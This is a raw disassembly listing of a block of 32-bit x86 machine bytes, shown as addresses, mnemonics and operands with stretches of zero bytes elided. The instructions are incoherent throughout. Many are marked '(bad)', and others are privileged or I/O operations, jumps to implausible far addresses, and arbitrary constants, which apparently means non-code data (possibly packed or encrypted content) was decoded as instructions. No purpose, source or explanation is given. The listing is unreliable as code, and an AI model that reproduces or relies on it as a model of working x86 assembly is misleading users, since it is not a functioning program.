  409196:	fsubr  QWORD PTR cs:[edi]
  409199:	(bad)  
  40919a:	xchg   ebx,eax
  40919b:	mov    ebx,0x5399fff6
  4091a0:	out    0xdd,eax
  4091a2:	pop    edi
  4091a3:	fdiv   st(6),st
  4091a5:	jmp    0x409199
  4091a7:	daa    
  4091a8:	mov    edi,0xe7531074
  4091ad:	shr    DWORD PTR [edi],1
  4091af:	fdiv   st(6),st
  4091b1:	mov    DWORD PTR [ebx+0x59fff6bb],0xce000012
  4091bb:	test   eax,0xdc91d084
  4091c0:	(bad)  
  4091c1:	push   eax
  4091c2:	out    0x63,al
  4091c4:	cmp    al,BYTE PTR [ecx-0x42]
  4091c7:	(bad)  [eax+esi*8-0x1235f]
  4091ce:	adc    ebp,DWORD PTR [edi]
  4091d0:	out    0xc5,eax
  4091d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091d3:	mov    ch,0x29
  4091d5:	call   FWORD PTR [esi]
  4091d7:	sahf   
  4091d8:	dec    esi
  4091d9:	mul    DWORD PTR [eax-0x7c427a03]
  4091df:	sub    eax,0x1ca7ff29
  4091e4:	jg     0x409181
  4091e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091e7:	sbb    eax,DWORD PTR [ebx]
  4091e9:	add    DWORD PTR [eax],0x0
	...
  4091fc:	add    BYTE PTR [eax],al
  4091fe:	add    BYTE PTR [edx+0x50],al
  409201:	xor    edi,edi
  409203:	js     0x409221
  409205:	clc    
  409206:	and    DWORD PTR [ecx],0x1c
  409209:	add    eax,DWORD PTR [eax]
  40920b:	and    al,0x77
  40920d:	sbb    al,0xf7
  40920f:	pusha  
  409210:	cmp    eax,0x9b230f04
  409215:	add    eax,DWORD PTR [eax]
  409217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409218:	ret    
  409219:	adc    eax,DWORD PTR [eax]
  40921b:	cmp    BYTE PTR [esi-0x6c508ad8],dl
  409221:	sub    BYTE PTR [ebp-0x4ad67ac8],bl
  409227:	inc    ebx
  409228:	test   DWORD PTR [ecx],ebp
  40922a:	jmp    FWORD PTR [eax]
  40922c:	paddb  mm4,mm7
  40922f:	ja     0x4091ce
  409231:	sub    bh,bh
  409233:	sbb    bh,ch
  409235:	sbb    esi,edi
  409237:	adc    BYTE PTR [ebp-0x7c608ad8],ch
  40923d:	(bad)  
  40923e:	popf   
  40923f:	add    BYTE PTR [ebp-0x32fc4ad8],bl
  409245:	sub    bh,bh
  409247:	lock inc esi
  409249:	sti    
  40924a:	out    0xb3,eax
  40924c:	xchg   ebp,eax
  40924d:	sub    bh,bh
  40924f:	loopne 0x4091f7
  409251:	dec    ebx
  409252:	neg    eax
  409254:	in     al,0x28
  409256:	jne    0x4091f7
  409258:	ret    
  409259:	aas    
  40925a:	popf   
  40925b:	enter  0x28d4,0xb5
  40925f:	jecxz  0x409263
  409261:	push   ds
  409262:	sub    DWORD PTR [eax],eax
	...
  409278:	mov    eax,0xc8fb9425
  40927d:	or     dh,BYTE PTR [edi+0x29]
  409280:	test   al,0x81
  409282:	dec    esp
  409283:	push   eax
  409284:	cwde   
  409285:	and    eax,0xa130406
  40928a:	push   0x67
  40928c:	ja     0x4092bb
  40928e:	imul   BYTE PTR [eax]
  409290:	mov    ds:0x2a7cdaaf,eax
  409295:	dec    esi
  409296:	fisubr WORD PTR [eax]
  409298:	js     0x4092bf
  40929a:	sbb    DWORD PTR [ecx],ebp
  40929c:	cli    
  40929d:	cli    
  40929e:	ror    BYTE PTR [edi+0x1cce250a],0xad
  4092a5:	cwde   
  4092a6:	call   0xd13b64d3
  4092ab:	jnp    0x4092df
  4092ad:	and    eax,0x1e1228b6
  4092b2:	mov    dh,0x28
  4092b4:	inc    eax
  4092b5:	sbb    bl,BYTE PTR [ebp-0x61dac79d]
  4092bb:	outs   dx,BYTE PTR ds:[esi]
  4092bc:	inc    ebx
  4092bd:	sub    eax,0x1b3f2896
  4092c2:	dec    ecx
  4092c3:	sub    BYTE PTR [eax],ah
  4092c5:	and    eax,0x25101b3c
  4092ca:	jle    0x4092e7
  4092cc:	icebp  
  4092cd:	popa   
  4092ce:	jbe    0x4092f8
  4092d0:	or     BYTE PTR [edi-0x73],ch
  4092d3:	xor    BYTE PTR [eax],al
  4092d5:	and    eax,0x25475451
  4092da:	pop    esi
  4092db:	sub    BYTE PTR [eax],al
	...
  4092f1:	cmp    cl,BYTE PTR [esi+0x5e]
  4092f4:	sub    al,ch
  4092f6:	sbb    DWORD PTR [ecx],esp
  4092f8:	arpl   ax,sp
  4092fa:	and    al,0x46
  4092fc:	outs   dx,BYTE PTR ds:[esi]
  4092fd:	xlat   BYTE PTR ds:[ebx]
  4092fe:	sub    al,0x3e
  409300:	sub    al,dl
  409302:	scas   al,BYTE PTR es:[edi]
  409303:	jmp    esp
  409305:	jg     0x4092b6
  409307:	pop    es
  409308:	inc    ecx
  409309:	dec    ebp
  40930a:	daa    
  40930b:	jmp    DWORD PTR [esi]
  40930d:	(bad)  
  40930e:	outs   dx,DWORD PTR ds:[esi]
  40930f:	lock push ss
  409311:	jg     0x409338
  409313:	call   0xff65d75d
  409318:	push   cs
  409319:	popa   
  40931a:	sub    al,0xe9
  40931c:	xor    al,0xc1
  40931e:	and    edi,edi
  409320:	inc    BYTE PTR [edx+0x28]
  409323:	call   0xff64e727
  409328:	and    dl,ch
  40932a:	idiv   bh
  40932c:	cmp    edi,esp
  40932e:	push   ss
  40932f:	and    DWORD PTR [ebp+0x42ff98bf],0xffffff9f
  409336:	and    esi,DWORD PTR [ebp-0x1f]
  409339:	mov    esp,0x80c69d64
  40933e:	jns    0x409385
  409340:	mov    ebp,0x283ab233
  409345:	mov    ds:0x62393523,eax
  40934a:	ret    
  40934b:	jmp    DWORD PTR [ebp+0x1be7fbf6]
  409351:	jle    0x409376
  409353:	inc    DWORD PTR [ecx]
	...
  409369:	add    ch,dh
  40936b:	call   0x27d7cb0
  409370:	add    cl,ch
  409372:	and    al,0x24
  409374:	jne    0x409367
  409376:	lods   al,BYTE PTR ds:[esi]
  409377:	mov    ds:0x23c076fc,al
  40937c:	jne    0x4093eb
  40937e:	enter  0x7ad,0x51
  409382:	push   edx
  409383:	test   edi,edi
  409385:	pop    esi
  409386:	mov    dl,0x40
  409388:	add    al,0xe9
  40938a:	xlat   BYTE PTR ds:[ebx]
  40938b:	js     0x409379
  40938d:	push   0xfe2e67
  409392:	popa   
  409393:	fld    TBYTE PTR [ecx+0x0]
  409396:	hlt    
  409397:	cli    
  409398:	(bad)  
  409399:	jne    0x409361
  40939b:	pop    es
  40939c:	jb     0x40933b
  40939e:	xchg   ecx,eax
  40939f:	fisttp DWORD PTR [eax+0x3868245]
  4093a5:	add    DWORD PTR [esi-0x767a7301],edi
  4093ab:	fdiv   st(6),st
  4093ad:	call   FWORD PTR [esi+0x7]
  4093b0:	shl    BYTE PTR [ecx-0x72],cl
  4093b3:	dec    DWORD PTR [edx]
  4093b5:	rcr    BYTE PTR [edx],0x4c
  4093b8:	cmp    al,0x4
  4093ba:	jg     0x4093bb
  4093bc:	push   DWORD PTR [esi+0x6b]
  4093bf:	xchg   DWORD PTR [ecx-0x730130c5],ecx
  4093c5:	test   DWORD PTR [ecx-0x23],ebx
  4093c8:	(bad)  
  4093c9:	jmp    FWORD PTR [esi+0xa3a906]
	...
  4093e3:	jno    0x4093c1
  4093e5:	dec    edi
  4093e6:	push   0xbeeeff4e
  4093eb:	scas   al,BYTE PTR es:[edi]
  4093ec:	(bad)  [eax+ecx*1+0x66]
  4093f0:	loop   0x4093b2
  4093f2:	call   DWORD PTR [ecx]
  4093f4:	pop    es
  4093f5:	neg    BYTE PTR [edi+0x75fedc01]
  4093fb:	adc    bl,ah
  4093fd:	je     0x409407
  4093ff:	xchg   BYTE PTR es:[edi+edi*8+0x4c1e631],bl
  409407:	push   cs
  409408:	push   edx
  409409:	mov    ch,ah
  40940b:	jge    0x4093f0
  40940d:	sti    
  40940e:	push   0xfffffffe
  409410:	mov    BYTE PTR ds:0xe726fbff,bl
  409416:	or     eax,0x89fedc23
  40941b:	dec    ebx
  40941c:	(bad)  [edi+0x0]
  40941f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409420:	sbb    DWORD PTR [esi],edx
  409422:	mov    esi,0x40e9b14f
  409427:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409428:	push   ecx
  409429:	pop    edi
  40942a:	cmp    esp,DWORD PTR [esi+0x19]
  40942d:	es jne 0x4093cf
  409430:	ror    DWORD PTR [edi-0x3c],0xc0
  409434:	shl    DWORD PTR ds:0xafdbbb75,cl
  40943a:	pop    es
  40943b:	mov    edi,0xa8ff8832
  409440:	loope  0x409482
  409442:	add    al,0xa7
  409444:	push   esi
  409445:	jp     0x409433
	...
  40945b:	add    BYTE PTR [esi],ah
  40945d:	lock dec esi
  40945f:	not    DWORD PTR [eax-0x74ba88df]
  409465:	jl     0x40948d
  409467:	jne    0x409400
  409469:	xor    BYTE PTR [edi-0x4cbf70f5],ch
  40946f:	push   DWORD PTR [eax+0x15]
  409472:	inc    ebx
  409473:	mov    cr0,eax
  409476:	add    eax,DWORD PTR [eax]
  409478:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409479:	push   0x2ba7f7bf
  40947e:	add    eax,DWORD PTR [eax]
  409480:	push   0xa0ff2fe7
  409485:	sub    eax,DWORD PTR [ebx]
  409487:	push   0xffffffa7
  409489:	lds    eax,FWORD PTR [ebx]
  40948b:	push   0xffffffa7
  40948d:	cmc    
  40948e:	add    ecx,DWORD PTR [ebp-0x732b8816]
  409494:	and    al,BYTE PTR [eax-0x23df00d3]
  40949a:	and    al,0x75
  40949c:	pop    ds
  40949d:	mov    DWORD PTR [edi-0x4c960005],ebp
  4094a3:	dec    DWORD PTR [eax]
  4094a5:	and    eax,0x82aa7443
  4094aa:	ins    DWORD PTR es:[edi],dx
  4094ab:	add    DWORD PTR [edi+0x79be902],esp
  4094b1:	jmp    0x40945a
  4094b3:	add    ebp,eax
  4094b5:	xchg   edi,eax
  4094b6:	clc    
  4094b7:	sbb    ecx,esi
  4094b9:	fs dec esi
  4094bb:	and    eax,0x77198d77
	...
  4094d4:	add    BYTE PTR [edx],ch
  4094d6:	pop    ss
  4094d7:	ss and eax,0x1b9ab2c8
  4094dd:	fisub  WORD PTR [esi+ebp*1+0x25]
  4094e1:	mov    BYTE PTR cs:[ecx],bl
  4094e4:	sub    eax,0xd51121b0
  4094e9:	or     DWORD PTR [edx],esp
  4094eb:	push   ss
  4094ec:	ja     0x409518
  4094ee:	and    dl,BYTE PTR [esi]
  4094f0:	and    eax,0x5590b298
  4094f5:	int3   
  4094f6:	ret    
  4094f7:	call   0xfe52e720
  4094fc:	and    al,0x80
  4094fe:	and    DWORD PTR [edi+esi*8-0x80],esi
  409502:	out    dx,eax
  409503:	mov    ah,BYTE PTR [eax+esi*2]
  409506:	mov    esp,DWORD PTR [edi+ebx*1+0x70]
  40950a:	and    esi,edx
  40950c:	cdq    
  40950d:	pusha  
  40950e:	test   eax,0x2e7e895
  409513:	(bad)  
  409514:	outs   dx,BYTE PTR ds:[esi]
  409515:	push   edi
  409516:	sbb    DWORD PTR [esi-0x1b68b7dc],edi
  40951c:	sbb    edx,DWORD PTR [ebp+0x2e24ae64]
  409522:	xchg   DWORD PTR [ebp+0x1321302c],edx
  409528:	add    al,0xbf
  40952a:	pop    ebp
  40952b:	rol    dl,cl
  40952d:	and    BYTE PTR [eax],ah
  40952f:	push   esp
  409530:	xor    edx,DWORD PTR [eax]
  409532:	and    DWORD PTR [esi-0x6ef165dc],eax
  409538:	sub    al,0x0
	...
  40954e:	inc    esi
  40954f:	and    DWORD PTR [eax],eax
  409551:	jbe    0x4095d0
  409553:	xchg   eax,ebp
  409555:	jbe    0x40951a
  409557:	and    DWORD PTR [edx-0x17],ebp
  40955a:	or     al,0x45
  40955c:	cmp    ebp,DWORD PTR [eax+0x59b521a4]
  409562:	xchg   ebx,eax
  409563:	and    edi,edi
  409565:	dec    esi
  409566:	or     DWORD PTR ds:0x214525e8,ecx
  40956c:	push   DWORD PTR [eax+0x49]
  40956f:	div    DWORD PTR ds:[esi]
  409572:	mov    ebp,DWORD PTR [edi+edi*8+0x40dd56c0]
  409579:	jmp    0x1730ed09
  40957e:	and    DWORD PTR [ecx],0xffffffff
  409581:	pushf  
  409582:	cwde   
  409583:	sub    cl,al
  409585:	dec    eax
  409586:	ret    
  409587:	pop    ds
  409588:	mov    DWORD PTR [esp+ebx*8+0x17],ebp
  40958c:	(bad)  
  40958d:	(bad)  
  40958e:	das    
  40958f:	and    BYTE PTR [edi-0x19],ah
  409592:	mov    bl,al
  409594:	(bad)  
  409595:	in     eax,dx
  409596:	or     dl,BYTE PTR [ebx]
  409598:	mul    esi
  40959a:	les    ebx,FWORD PTR [edi]
  40959c:	jne    0x40958b
  40959e:	mov    esp,0x84d6a168
  4095a3:	mov    DWORD PTR [ebp-0xe0434b],eax
  4095a9:	push   0xffffffc6
  4095ab:	idiv   DWORD PTR es:[esi+0x30740284]
	...
  4095c6:	add    BYTE PTR [eax],ch
  4095c8:	pop    esi
  4095c9:	in     al,dx
  4095ca:	mov    dh,0x84
  4095cc:	pop    ds
  4095cd:	add    BYTE PTR ds:0x91bd851b,bl
  4095d3:	mov    WORD PTR [edi],ds
  4095d5:	(bad)  
  4095d6:	jmp    0xf9a83f13
  4095db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095dc:	das    
  4095dd:	mov    esi,0x77a2900
  4095e2:	call   0x3f371e
  4095e7:	jns    0x4095a2
  4095e9:	jmp    0x4095e2
  4095eb:	mov    ebx,esp
  4095ed:	(bad)  
  4095ee:	jne    0x4095e6
  4095f0:	jmp    0x40962e
  4095f2:	fwait
  4095f3:	dec    ecx
  4095f4:	jecxz  0x4095f4
  4095f6:	mov    ch,0x66
  4095f8:	sti    
  4095f9:	(bad)  
  4095fa:	jmp    FWORD PTR [ecx+0x79]
  4095fd:	pop    es
  4095fe:	call   0x3f35bc
  409603:	mov    DWORD PTR [ecx-0x1c860821],edi
  409609:	(bad)  
  40960a:	mov    ch,0x62
  40960c:	sti    
  40960d:	(bad)  
  40960e:	dec    DWORD PTR [ecx-0x6617f887]
  409614:	mov    al,ds:0xb9b9fffe
  409619:	xlat   BYTE PTR ds:[ebx]
  40961a:	imul   DWORD PTR [ecx-0x698a011d]
  409620:	jmp    0x40962e
  409622:	fwait
  409623:	mov    esp,esp
  409625:	(bad)  
  409626:	mov    ch,0x9a
  409628:	sti    
  409629:	(bad)  
  40962a:	inc    DWORD PTR [eax]
	...
  409640:	mov    DWORD PTR [edx+0x7],edi
  409643:	call   0x3f33d1
  409648:	dec    ecx
  409649:	mov    edx,0xe479f7d3
  40964e:	(bad)  
  40964f:	jne    0x409697
  409651:	jmp    0x409643
  409653:	call   0xfc62:0xb5fee469
  40965a:	(bad)  
  40965b:	jmp    DWORD PTR [esi+0x0]
  40965e:	popf   
  40965f:	dec    DWORD PTR [ecx]
  409661:	in     al,0xb4
  409663:	in     al,dx
  409664:	adc    esp,esp
  409666:	(bad)  
  409667:	call   0x40187a
  40966c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40966d:	js     0x4096c7
  40966f:	call   0xe8632684
  409674:	or     ah,BYTE PTR [esi-0x29f700df]
  40967a:	test   DWORD PTR ds:[eax],0x1ada2a98
  409681:	mov    al,0x21
  409683:	(bad)  
  409684:	cmp    al,cl
  409686:	sbb    edi,edi
  409688:	call   0xe0dde83d
  40968d:	mov    bh,0x21
  40968f:	mov    ch,0xf3
  409691:	mov    bh,0x21
  409693:	(bad)  
  409694:	mov    edi,0xc8ff7fec
  409699:	fist   WORD PTR [edi-0x10]
  40969c:	mov    eax,0x32ff21d7
  4096a1:	cmp    eax,0x7522
	...
  4096b6:	add    BYTE PTR [eax],al
  4096b8:	add    BYTE PTR [edi-0x5701f60f],bl
  4096be:	jmp    DWORD PTR [ecx]
  4096c0:	mov    ch,0x97
  4096c2:	std    
  4096c3:	and    edi,edi
  4096c5:	pop    esp
  4096c7:	jg     0x4096c8
  4096c9:	nop
  4096ca:	add    eax,0x217ef7c8
  4096cf:	and    edi,edi
  4096d1:	adc    BYTE PTR ds:0x1a8ffb97,0xb1
  4096d8:	push   DWORD PTR [eax+0x53]
  4096db:	inc    esi
  4096dc:	or     al,0xa7
  4096de:	(bad)  
  4096df:	mov    esp,gs
  4096e1:	and    al,0x70
  4096e3:	and    BYTE PTR [edx-0x59],ch
  4096e6:	rol    DWORD PTR [eax],0xff
  4096e9:	ficom  DWORD PTR [ebx]
  4096eb:	sub    edi,DWORD PTR [edx-0x76dea2d3]
  4096f1:	jmp    0x3ea:0x7cd6ac57
  4096f8:	(bad)  
  4096f9:	jp     0x4096fd
  4096fb:	sbb    ebx,ebp
  4096fd:	out    0x2,eax
  4096ff:	sahf   
  409700:	xchg   edi,eax
  409701:	test   al,0x2a
  409703:	test   eax,0x11e181f
  409708:	cmp    esp,ecx
  40970a:	ret    
  40970b:	call   0xe9433dbb
  409710:	add    DWORD PTR [eax],0xffffff98
  409713:	loopne 0x409740
  409715:	dec    ecx
  409716:	and    BYTE PTR [esi+0x21],ch
  409719:	lock xchg edi,eax
  40971b:	and    DWORD PTR fs:[eax],eax
	...
  409732:	jb     0x40973e
  409734:	push   ecx
  409735:	dec    edi
  409736:	cmp    eax,0xe54b561e
  40973b:	push   es
  40973c:	jmp    0x6a6fb4f7
  409741:	dec    eax
  409742:	retf   
  409743:	mov    ah,0x95
  409745:	lods   eax,DWORD PTR ds:[esi]
  409746:	shr    BYTE PTR [ebx+0xa322108],0x41
  40974d:	mov    cl,0xe
  40974f:	push   ds
  409750:	mov    esp,DWORD PTR es:[edx+0x1e]
  409754:	jb     0x40972d
  409756:	das    
  409757:	jmp    0xec5b:0xdf2c03a7
  40975e:	out    0x2,eax
  409760:	imul   esp,ecx,0xab879188
  409766:	retf   
  409767:	fisub  WORD PTR [edi+0x352ad103]
  40976d:	mov    cl,0x70
  40976f:	sbb    eax,0xde8fac39
  409774:	daa    
  409775:	add    al,0xf8
  409777:	sub    al,BYTE PTR [ecx+0x331d58b0]
  40977d:	or     eax,0xcec9767
  409782:	jne    0x40971a
  409784:	adc    bh,BYTE PTR [edx-0x70ffbbb8]
  40978a:	xchg   DWORD PTR ds:0xc250f868,ebx
  409790:	(bad)  
  409791:	cmp    BYTE PTR [ebx+0x27],bh
  409794:	mov    al,ds:0x9e
	...
  4097a9:	add    BYTE PTR [eax],al
  4097ab:	(bad)  
  4097ac:	mov    dl,0x67
  4097ae:	jmp    0x1fec557
  4097b3:	pop    ss
  4097b4:	fld    DWORD PTR [eax-0x17]
  4097b7:	push   esp
  4097b8:	sbb    al,0x75
  4097ba:	icebp  
  4097bb:	int3   
  4097bc:	outs   dx,DWORD PTR ds:[esi]
  4097bd:	shl    DWORD PTR [esi-0x39],0x2a
  4097c1:	(bad)  [ebp-0x39]
  4097c4:	sbb    eax,0x9cdee8eb
  4097c9:	cmp    eax,0x461b39e9
  4097ce:	push   ebp
  4097cf:	repz pop esp
  4097d1:	mov    ecx,0xff1d874e
  4097d6:	cmp    edx,DWORD PTR [esi-0x26]
  4097d9:	push   es
  4097da:	mov    ah,0x27
  4097dc:	sbb    eax,0x97873575
  4097e1:	pop    es
  4097e2:	inc    ecx
  4097e3:	fnstcw WORD PTR [edx-0x1]
  4097e6:	es out 0xbe,eax
  4097e9:	enter  0xa82b,0x2
  4097ed:	push   ebp
  4097ee:	(bad)  
  4097ef:	enter  0xc47f,0xd
  4097f3:	(bad)  
  4097f4:	xchg   ebp,eax
  4097f5:	or     eax,DWORD PTR [esi]
  4097f7:	xor    DWORD PTR [eax+ebp*8],eax
  4097fa:	(bad)  
  4097fd:	jmp    DWORD PTR [eax+0x61]
  409800:	sbb    bh,bh
  409802:	je     0x409794
  409804:	sbb    esi,DWORD PTR [ebp-0xf]
  409807:	mov    esp,0xc0de9476
  40980c:	xchg   DWORD PTR [ebp-0x1b],ecx
	...
  409823:	add    BYTE PTR [ebp+0x242b7442],ch
  409829:	(bad)  
  40982b:	dec    DWORD PTR [edx+0x275fe21]
  409831:	out    dx,eax
  409832:	xchg   esp,eax
  409833:	pushf  
  409834:	icebp  
  409835:	sti    
  409836:	dec    edi
  409837:	(bad)  
  409838:	jnp    0x40982c
  40983a:	(bad)  
  40983b:	jne    0x40983f
  40983d:	push   edi
  40983e:	(bad)  
  40983f:	jne    0x409857
  409841:	call   0xfc722f11
  409846:	pop    ecx
  409847:	mov    esi,DWORD PTR [ebx-0x1c67d0e]
  40984d:	jp     0x409858
  40984f:	push   edx
  409850:	push   ss
  409851:	pop    esp
  409852:	fwait
  409853:	push   DWORD PTR [ecx+0x27]
  409856:	mov    edi,0x7d80daeb
  40985b:	adc    dh,bh
  40985d:	jae    0x409866
  40985f:	mov    ecx,DWORD PTR [ebx]
  409861:	adc    dh,bh
  409863:	jne    0x4098d7
  409865:	mov    eax,DWORD PTR [eax]
  409867:	mov    edi,DWORD PTR [edi+eiz*8+0x1]
  40986b:	sub    edi,DWORD PTR [esi-0x33]
  40986e:	ror    DWORD PTR [esi+ecx*8],0x5a
  409872:	mov    ch,ah
  409874:	jno    0x4098ef
  409876:	or     edi,edi
  409878:	sti    
  409879:	pop    es
  40987a:	call   0xff3bc138
  40987f:	(bad)  
  409880:	cmp    ecx,DWORD PTR [ebx]
  409882:	push   eax
  409883:	(bad)  
  409884:	cmp    eax,DWORD PTR [edi]
  409886:	call   0x4098bc
	...
  40989b:	add    BYTE PTR [eax],al
  40989d:	sbb    esp,edi
  40989f:	dec    cl
  4098a1:	mov    esp,0xf555000e
  4098a6:	rol    BYTE PTR [edx+0x5654cec4],cl
  4098ac:	push   ebx
  4098ad:	std    
  4098ae:	popa   
  4098af:	pop    es
  4098b0:	add    dl,cl
  4098b2:	adc    BYTE PTR [edx+0x73ff527d],al
  4098b8:	or     al,0xa7
  4098ba:	test   al,0x9f
  4098bc:	(bad)  
  4098be:	mov    ch,0x5
  4098c0:	or     edx,0x3d
  4098c3:	add    esi,DWORD PTR [ebp-0x52]
  4098c6:	lock inc ebx
  4098c8:	pop    ebx
  4098c9:	fdiv   st,st(3)
  4098cb:	dec    esp
  4098cc:	ret    0x2997
  4098cf:	mov    al,BYTE PTR [ebp-0x65]
  4098d2:	test   al,0x22
  4098d4:	pop    es
  4098d5:	and    al,0xfe
  4098d7:	lldt   WORD PTR [ebx-0x643ff5d3]
  4098de:	and    ch,dl
  4098e0:	mov    edi,0xc8bde46c
  4098e5:	in     eax,0x38
  4098e7:	add    ecx,DWORD PTR [ebx-0x1f7dc29e]
  4098ed:	test   al,0xa8
  4098ef:	lahf   
  4098f0:	adc    esp,DWORD PTR [edi-0x18f4f8c3]
  4098f6:	xor    al,0xc
  4098f8:	sub    esp,edi
  4098fa:	dec    edi
  4098fb:	mov    esi,0xf2e6de5d
  409900:	inc    DWORD PTR [eax]
	...
  409916:	jge    0x4098f8
  409918:	sbb    eax,0xc7acb375
  40991d:	mov    edi,0xb436e24
  409922:	mov    al,0x55
  409924:	inc    ebx
  409925:	call   0xff5f1905
  40992a:	mov    ds:0x2cc3c793,eax
  40992f:	outs   dx,DWORD PTR ds:[esi]
  409930:	inc    edi
  409931:	mov    esi,0xffc447cc
  409936:	dec    edi
  409937:	adc    eax,0x1ca70003
  40993c:	mov    si,dx
  40993f:	and    ecx,DWORD PTR [edx+0x661ca34d]
  409945:	(bad)  
  409946:	loop   0x40994a
  409948:	fnstenv [ecx+eiz*2-0x2de25770]
  40994f:	rol    DWORD PTR ds:[edx+ecx*1+0x1a],0xce
  409955:	sbb    eax,0x81d13ed2
  40995a:	sbb    al,0x1a
  40995c:	mov    esi,0x6606b21d
  409961:	(bad)  
  409962:	lock test DWORD PTR [esp+eax*2],esp
  409966:	mov    WORD PTR [ecx],ds
  409968:	sbb    al,0x44
  40996a:	jnp    0x8c58b6f2
  409970:	sub    al,0x48
  409972:	adc    ecx,DWORD PTR [esp+0x78901a48]
  409979:	mov    DWORD PTR [eax],eax
	...
  40998f:	cmp    BYTE PTR [esi],0x40
  409992:	hlt    
  409993:	clc    
  409994:	sbb    ecx,ebp
  409996:	adc    BYTE PTR [ebx+0x59],cl
  409999:	mov    dl,0xdf
  40999b:	add    ah,BYTE PTR [bx+si-0x58f7]
  4099a0:	add    ch,cl
  4099a2:	adc    BYTE PTR [ebx],al
  4099a4:	mov    ds,esp
  4099a6:	or     ebx,DWORD PTR [eax+ecx*8]
  4099a9:	fcom   QWORD PTR [eax]
  4099ab:	add    ecx,DWORD PTR [eax+0x195723ac]
  4099b1:	mov    ah,0x43
  4099b3:	mov    eax,0x402c2c8f
  4099b8:	pop    edi
  4099b9:	cs sbb eax,0x2c2c8fa8
  4099bf:	aad    0x7d
  4099c1:	push   ds
  4099c2:	sbb    eax,0x139c879b
  4099c7:	and    dl,BYTE PTR [edi+0x2b75b20]
  4099cd:	jmp    0x6c9f0dd5
  4099d2:	xchg   edi,eax
  4099d3:	pop    eax
  4099d4:	pop    ebx
  4099d5:	add    cl,ah
  4099d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099d8:	add    al,BYTE PTR [eax]
  4099da:	cli    
  4099db:	add    BYTE PTR [ebp+0x41697400],ch
  4099e1:	push   eax
  4099e2:	ror    DWORD PTR [esi+0x1fe90086],1
  4099e8:	(bad)  
  4099e9:	punpckldq mm5,DWORD PTR [ecx]
  4099ec:	cmc    
  4099ed:	rcl    dh,0xa7
  4099f0:	or     eax,0x35ff
	...
  409a05:	add    BYTE PTR [eax],al
  409a07:	add    BYTE PTR [edx],al
  409a09:	sub    al,0xf
  409a0b:	imul   esp,DWORD PTR fs:[ecx],0x20f11750
  409a12:	jnp    0x409a8a
  409a14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a15:	add    al,BYTE PTR [ebx+0xac9aca7]
  409a1b:	xchg   esi,eax
  409a1c:	cmp    DWORD PTR [esi],esp
  409a1e:	xorps  xmm4,xmm2
  409a21:	pop    ss
  409a22:	add    DWORD PTR [ecx-0x2dfe6e54],0xffffff94
  409a29:	in     eax,dx
  409a2a:	je     0x409a05
  409a2c:	mov    ch,0x28
  409a2e:	push   0xffffffe9
  409a30:	sbb    DWORD PTR ds:[ecx-0x17],ebp
  409a34:	push   cs
  409a35:	sbb    DWORD PTR [ebp+0x5e],edx
  409a38:	xor    DWORD PTR [ecx],ecx
  409a3a:	push   0xffffffe9
  409a3c:	(bad)  
  409a3d:	sbb    bh,ah
  409a3f:	movhps QWORD PTR [ecx],xmm3
  409a42:	push   edx
  409a44:	mov    gs,WORD PTR fs:[eax]
  409a47:	cdq    
  409a48:	hlt    
  409a49:	and    ah,dl
  409a4b:	push   ebx
  409a4c:	xchg   ebx,eax
  409a4d:	sbb    DWORD PTR [ebx-0x5512ef],ecx
  409a53:	xchg   edx,eax
  409a54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a55:	mov    cl,0x52
  409a57:	mov    bh,0xbb
  409a59:	lea    ecx,[edi]
  409a5b:	and    DWORD PTR [esp+ebp*4-0x5376ff01],0xffffffff
  409a63:	dec    DWORD PTR [esi+0x7675c00b]
  409a69:	push   ebx
  409a6a:	out    0x9d,eax
	...
  409a80:	add    ah,dl
  409a82:	idiv   dh
  409a84:	sub    edx,DWORD PTR [ebp-0x16a43c76]
  409a8a:	pop    esp
  409a8b:	enter  0x5ec2,0x4
  409a8f:	push   ebp
  409a90:	mov    ebp,DWORD PTR [edx-0x80]
  409a93:	(bad)  
  409a94:	lock xchg ecx,eax
  409a96:	dec    edi
  409a97:	sub    bl,bl
  409a99:	imul   esi,DWORD PTR [edx+0xb],0xe80673ff
  409aa0:	add    ebx,edx
  409aa2:	sti    
  409aa3:	(bad)  
  409aa4:	push   eax
  409aa5:	stc    
  409aa6:	jno    0x409aaf
  409aa8:	call   0x3f2f2d
  409aad:	xchg   ebp,eax
  409aae:	not    BYTE PTR [edi+0x3]
  409ab1:	ss or  al,al
  409ab4:	je     0x409a77
  409ab6:	mov    DWORD PTR [ebp-0xc],eax
  409ab9:	sahf   
  409aba:	sti    
  409abb:	je     0x409ac9
  409abd:	jns    0x409b30
  409abf:	pop    es
  409ac0:	call   0x3f942a
  409ac5:	xchg   DWORD PTR [ecx-0x5],eax
  409ac8:	lea    edx,[ebx]
  409aca:	hlt    
  409acb:	dec    edi
  409acc:	push   ebx
  409ace:	(bad)  
  409acf:	(bad)  
  409ad0:	jne    0x409a98
  409ad2:	jmp    0x409a6c
  409ad4:	std    
  409ad5:	pop    ecx
  409ad6:	sti    
  409ad7:	mov    BYTE PTR [ebp+0x66],al
  409ada:	sti    
  409adb:	je     0x409acd
  409add:	jns    0x409b50
  409adf:	idiv   edi
  409ae1:	repz pop es
  409ae3:	push   DWORD PTR [ebp+0x0]
	...
  409afa:	jp     0x409ae2
  409afc:	adc    dh,bh
  409afe:	leave  
  409aff:	sti    
  409b00:	mov    bl,al
  409b02:	mov    ecx,0xa7e8fb71
  409b07:	cmp    eax,0x888ff7d
  409b0c:	xchg   ecx,eax
  409b0d:	test   DWORD PTR [edi+0x78ff7d45],0x70570373
  409b17:	xchg   esi,eax
  409b18:	or     ch,al
  409b1a:	aas    
  409b1b:	mov    edx,0x6c2cff1a
  409b20:	mov    esi,0xb6b6e5e
  409b25:	add    dl,bh
  409b27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b28:	es or  edx,0x35
  409b2c:	add    DWORD PTR [edx-0x7a],esi
  409b2f:	inc    eax
  409b30:	nop
  409b31:	(bad)  
